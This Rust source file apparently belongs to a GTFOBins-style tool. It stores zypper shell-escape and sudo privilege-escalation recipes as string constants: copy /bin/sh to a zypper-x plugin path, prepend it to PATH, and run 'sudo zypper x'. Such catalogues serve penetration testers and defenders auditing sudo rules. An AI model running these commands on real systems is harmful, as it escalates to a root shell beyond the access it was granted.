pub static BIN_NAME: &'static str = "zypper";
pub static SH_DESC_1: &'static str = "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.";
pub static SH_CODE_1: &'static str = r#"
    
    zypper x
"#;
pub static SH_CODE_2: &'static str = r#"
    
    TF=$(mktemp -d)
    cp /bin/sh $TF/zypper-x
    export PATH=$TF:$PATH
    zypper x
"#;
pub static SUDO_DESC_1: &'static str = "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.";
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo zypper x
"#;
pub static SUDO_CODE_2: &'static str = r#"
    
    TF=$(mktemp -d)
    cp /bin/sh $TF/zypper-x
    sudo PATH=$TF:$PATH zypper x
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SHELL_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SHELL_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
